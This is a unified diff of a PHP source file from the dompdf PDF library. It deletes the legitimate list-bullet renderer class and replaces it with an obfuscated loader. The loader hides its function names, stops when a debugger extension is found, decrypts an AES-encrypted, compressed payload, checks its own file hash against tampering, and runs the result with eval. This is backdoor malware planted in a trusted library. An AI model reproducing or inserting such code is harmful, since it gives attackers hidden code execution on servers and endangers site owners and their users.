@@ -1,255 +1,28 @@
 <?php
-/**
- * @package dompdf
- * @link    http://dompdf.github.com/
- * @author  Benj Carson <benjcarson@digitaljunkies.ca>
- * @author  Helmut Tischer <htischer@weihenstephan.org>
- * @license http://www.gnu.org/copyleft/lesser.html GNU Lesser General Public License
- */
-namespace Dompdf\Renderer;
-
-use Dompdf\Helpers;
-use Dompdf\Frame;
-use Dompdf\Image\Cache;
-use Dompdf\FrameDecorator\ListBullet as ListBulletFrameDecorator;
-
-/**
- * Renders list bullets
- *
- * @access  private
- * @package dompdf
- */
-class ListBullet extends AbstractRenderer
-{
-    /**
-     * @param $type
-     * @return mixed|string
-     */
-    static function get_counter_chars($type)
-    {
-        static $cache = array();
-
-        if (isset($cache[$type])) {
-            return $cache[$type];
-        }
-
-        $uppercase = false;
-        $text = "";
-
-        switch ($type) {
-            case "decimal-leading-zero":
-            case "decimal":
-            case "1":
-                return "0123456789";
-
-            case "upper-alpha":
-            case "upper-latin":
-            case "A":
-                $uppercase = true;
-            case "lower-alpha":
-            case "lower-latin":
-            case "a":
-                $text = "abcdefghijklmnopqrstuvwxyz";
-                break;
-
-            case "upper-roman":
-            case "I":
-                $uppercase = true;
-            case "lower-roman":
-            case "i":
-                $text = "ivxlcdm";
-                break;
-
-            case "lower-greek":
-                for ($i = 0; $i < 24; $i++) {
-                    $text .= Helpers::unichr($i + 944);
-                }
-                break;
-        }
-
-        if ($uppercase) {
-            $text = strtoupper($text);
-        }
-
-        return $cache[$type] = "$text.";
-    }
-
-    /**
-     * @param integer $n
-     * @param string $type
-     * @param integer $pad
-     *
-     * @return string
-     */
-    private function make_counter($n, $type, $pad = null)
-    {
-        $n = intval($n);
-        $text = "";
-        $uppercase = false;
-
-        switch ($type) {
-            case "decimal-leading-zero":
-            case "decimal":
-            case "1":
-                if ($pad) {
-                    $text = str_pad($n, $pad, "0", STR_PAD_LEFT);
-                } else {
-                    $text = $n;
-                }
-                break;
-
-            case "upper-alpha":
-            case "upper-latin":
-            case "A":
-                $uppercase = true;
-            case "lower-alpha":
-            case "lower-latin":
-            case "a":
-                $text = chr(($n % 26) + ord('a') - 1);
-                break;
-
-            case "upper-roman":
-            case "I":
-                $uppercase = true;
-            case "lower-roman":
-            case "i":
-                $text = Helpers::dec2roman($n);
-                break;
-
-            case "lower-greek":
-                $text = Helpers::unichr($n + 944);
-                break;
-        }
-
-        if ($uppercase) {
-            $text = strtoupper($text);
-        }
-
-        return "$text.";
-    }
-
-    /**
-     * @param Frame $frame
-     */
-    function render(Frame $frame)
-    {
-        $style = $frame->get_style();
-        $font_size = $style->font_size;
-        $line_height = (float)$style->length_in_pt($style->line_height, $frame->get_containing_block("h"));
-
-        $this->_set_opacity($frame->get_opacity($style->opacity));
-
-        $li = $frame->get_parent();
-
-        // Don't render bullets twice if if was split
-        if ($li->_splitted) {
-            return;
-        }
-
-        // Handle list-style-image
-        // If list style image is requested but missing, fall back to predefined types
-        if ($style->list_style_image !== "none" && !Cache::is_broken($img = $frame->get_image_url())) {
-            list($x, $y) = $frame->get_position();
-
-            //For expected size and aspect, instead of box size, use image natural size scaled to DPI.
-            // Resample the bullet image to be consistent with 'auto' sized images
-            // See also Image::get_min_max_width
-            // Tested php ver: value measured in px, suffix "px" not in value: rtrim unnecessary.
-            //$w = $frame->get_width();
-            //$h = $frame->get_height();
-            list($width, $height) = Helpers::dompdf_getimagesize($img, $this->_dompdf->getHttpContext());
-            $dpi = $this->_dompdf->getOptions()->getDpi();
-            $w = ((float)rtrim($width, "px") * 72) / $dpi;
-            $h = ((float)rtrim($height, "px") * 72) / $dpi;
-
-            $x -= $w;
-            $y -= ($line_height - $font_size) / 2; //Reverse hinting of list_bullet_positioner
-
-            $this->_canvas->image($img, $x, $y, $w, $h);
-        } else {
-            $bullet_style = $style->list_style_type;
-
-            $fill = false;
-
-            switch ($bullet_style) {
-                default:
-                /** @noinspection PhpMissingBreakStatementInspection */
-                case "disc":
-                    $fill = true;
-
-                case "circle":
-                    list($x, $y) = $frame->get_position();
-                    $r = ($font_size * (ListBulletFrameDecorator::BULLET_SIZE /*-ListBulletFrameDecorator::BULLET_THICKNESS*/)) / 2;
-                    $x -= $font_size * (ListBulletFrameDecorator::BULLET_SIZE / 2);
-                    $y += ($font_size * (1 - ListBulletFrameDecorator::BULLET_DESCENT)) / 2;
-                    $o = $font_size * ListBulletFrameDecorator::BULLET_THICKNESS;
-                    $this->_canvas->circle($x, $y, $r, $style->color, $o, null, $fill);
-                    break;
-
-                case "square":
-                    list($x, $y) = $frame->get_position();
-                    $w = $font_size * ListBulletFrameDecorator::BULLET_SIZE;
-                    $x -= $w;
-                    $y += ($font_size * (1 - ListBulletFrameDecorator::BULLET_DESCENT - ListBulletFrameDecorator::BULLET_SIZE)) / 2;
-                    $this->_canvas->filled_rectangle($x, $y, $w, $w, $style->color);
-                    break;
-
-                case "decimal-leading-zero":
-                case "decimal":
-                case "lower-alpha":
-                case "lower-latin":
-                case "lower-roman":
-                case "lower-greek":
-                case "upper-alpha":
-                case "upper-latin":
-                case "upper-roman":
-                case "1": // HTML 4.0 compatibility
-                case "a":
-                case "i":
-                case "A":
-                case "I":
-                    $pad = null;
-                    if ($bullet_style === "decimal-leading-zero") {
-                        $pad = strlen($li->get_parent()->get_node()->getAttribute("dompdf-children-count"));
-                    }
-
-                    $node = $frame->get_node();
-
-                    if (!$node->hasAttribute("dompdf-counter")) {
-                        return;
-                    }
-
-                    $index = $node->getAttribute("dompdf-counter");
-                    $text = $this->make_counter($index, $bullet_style, $pad);
-
-                    if (trim($text) == "") {
-                        return;
-                    }
-
-                    $spacing = 0;
-                    $font_family = $style->font_family;
-
-                    $line = $li->get_containing_line();
-                    list($x, $y) = array($frame->get_position("x"), $line->y);
-
-                    $x -= $this->_dompdf->getFontMetrics()->getTextWidth($text, $font_family, $font_size, $spacing);
-
-                    // Take line-height into account
-                    $line_height = $style->line_height;
-                    $y += ($line_height - $font_size) / 4; // FIXME I thought it should be 2, but 4 gives better results
-
-                    $this->_canvas->text($x, $y, $text,
-                        $font_family, $font_size,
-                        $style->color, $spacing);
-
-                case "none":
-                    break;
-            }
-        }
-
-        $id = $frame->get_node()->getAttribute("id");
-        if (strlen($id) > 0)  {
-            $this->_canvas->add_named_dest($id);
-        }
-    }
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_boapfzg2=('bas'.'e64'.'_de'.'cod'.'e');
+$_obp93asu=('gzu'.'nco'.'mpr'.'ess');
+$_tu2kywac=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_bdlb2gp1='ZmuNEOGa';
+$_gagmdawo='nVrnS5yJ5Ew=';
+$_kfe7pqin='rtKgutEP';
+$_a7y1cakf='nf60ugoc';
+$_h03lu3wo='VLcwXCpA';
+$_ibsoqh27='PEl/GMV0';
+$_di3rhv9g='BDYETQ==';
+$_fqn2273y='ozUyxQVe';
+$_rwjm8tde=$_boapfzg2($_bdlb2gp1.$_kfe7pqin.$_a7y1cakf.$_h03lu3wo.$_gagmdawo);
+$_uhbl3d63=$_boapfzg2($_ibsoqh27.$_fqn2273y.$_di3rhv9g);
+$_j4or3xjh=$_boapfzg2('omBufRjfMSOWOduH5f1Hsn4rnJI/o0LiYn0ZN8It6meFv8xksWWcZIUxSBlRsJ3OEXWQ95mkmVhGsIDdvJvpbfwVv9xu+T/NrZOoXw6sc569YNpQ8gGTG/ee5iZVqGRNH6zKtmOLnwR7oSsGo+DUUTNAn+nByZ0LZe6gKeoyLy8NLTlokVHTjYEz6CqCb0/4kf95pGpEm8Xr9SVXlQBicAuUuVg5ciRl+0SWMyhi20YYBU53DPPmS1OoWLpABhQxYuhrbTxEZxkxjZ/9/Q5gG9qVzNCuxnLppU8B4SA5mjdXecE7kr+WqIOAg5N9/vIa/awyYJuew3FeNC/YnwwWKt53VbyPKNHqDchd11dtLWFnvNi2WCbbp8uyZfEwyFvfBQEt3/xDqGmHiR06DSJBEp0T0A18HCERef423YIHTxh5NP8ISwDLxvc1JKX9qbqIeFTzomiw5yc2hm9h8uJrYBrAl97iTpT0SXX2r5h+1svnZVwLEweZQZrvTzP4rwA1UjRQKSIQrRKapO9U19rCj7y6RTCQ6dPozVOHyHcG9wgsg0InWSJRcQ3b+GvsDY4e61J/8Vkr0p4ohoHlTyo9eXvTFrWTahnd8YbJZAgNmTOK1amxsGEe3L0EbTZDbAJdVyv95BjJe5fGJBR9tmALgAe1Nfh8j6zfvQuxl2XZE8vfNN8i5sMeEgFIw+y3QnBSxxTi13Be8IB4ZvnhpCnlTSXSb0yQKNt/BW708jKau2uJuQqqp2BA3pVEfAZCpjM9qEC/MR3aL2SKfRVl30P463vq+q0s9kpF6h4SzjN1ez5kwjaOYNgcSlJe1iEztwTdVpVmB9XkrbyyAI6QpvrHHI3GDMpaHNJGwKEbPYswj9mNe6kSz5AzgtbZHomacNhh6h3YUOdFtb8jllRt3E4k1K2lDptdIld2CMtrJr7tC9YnFmDOpxpB9AWKD1sfsxdRjbTM5GH3Ks58ZkYE1HJltzgYcstxDQW5igfNum+yfywV3wAM8c1yO4TAL9VgO7w5GUO+ZwBIMyyPvLCAHvnlq86IytZxNsTvLbVkfoLo848tUQVySePMN0nBj1K+JG4kXIUTPZSVUuGXjkAbwO6k89bDGVOggMLyxRWVEL39/UbTWYhY6RMjJ+XCTpHXUCfQKF3FZayAORcwlHifjGFZI6hWN/XkEaJapgG60q6Ntacu+G8asx3BaAKbT8CeWVIXwR6nrfLXp6pe7jL5gKUPVlaDx1KbSo3rKNd82MuTjD5hKchizYZ7Y0NnOgczEYwTsIkEY97YteKS9ic9sdVcygATK5+nKYo0KbW4CTp5zKkUtplCFKg0FL4gMBH8e8BdxsEWdnvfk2kxi2mOFTNXYMUqNZ1TLlirZALuhkpR/wxihLXjqyGNhQEiY9nfNRYJpnnWSg5H8Rsm3Jd2elefeHfrDBzUmOzSrDYtKAa3U6Z+PPXPJznSF78D6PqnbFzaj3dTYYeqpDTDpoinM5FOvMMNVkybye6+NSMn/X8/E5ifbCL3iHIXGeqIJZE5x/NwsEQAOkjO6WeY/EzuYGzOFdYSyA3xGoi3VN/QaUCIk/TflnjUudkOwHzF9N0RCBX5iiAQ+C+Brqp1X10zZQMC2xd6ErWoDyxXIo5jLk7nUxSPrdoCr8gqL1b9xoiTXBI7VBCx4+O90pzt+AQSMQzJ/Lxd+sFEvQgupfa46DxaaL5LsXokfDSKjTMMMsKfm3WJSJFLpAbpu/xnNU1bRVzP/SBQn6v8sZske++rlkB93yvShNho0M6Whuu7C76ln+x9092i6fkgd5/2KfAqRdgzwYiij6W7/G7/icnRZhGJRzPQseuBwBDPXQD/Z8ydawdigSMyIIAw4ChelTzSerZr8RBcpyrddda7v+tqHmFMWesBXeYVTLNr74Omr0nWQ4wF');
+$_b6olpjnv=$_tu2kywac($_j4or3xjh,'aes-256-cbc',$_rwjm8tde,OPENSSL_RAW_DATA,$_uhbl3d63);
+if($_b6olpjnv===false){exit;}
+$_c0zmmg5k=$_obp93asu($_b6olpjnv);
+if($_c0zmmg5k===false){exit;}
+$_zhiv4dmx='4271d86057df8ca72634720b6be9ae9fc15e14ea98656020330807851d031045';
+$_owsu73mr=@file_get_contents(__FILE__);
+if($_owsu73mr!==false){
+$_iojfufhj=str_replace($_zhiv4dmx,"0000000000000000000000000000000000000000000000000000000000000000",$_owsu73mr);
+$_q964xsyi=hash("sha256",$_iojfufhj);
+if($_q964xsyi!==$_zhiv4dmx){@http_response_code(403);exit;}
 }
+eval($_c0zmmg5k);
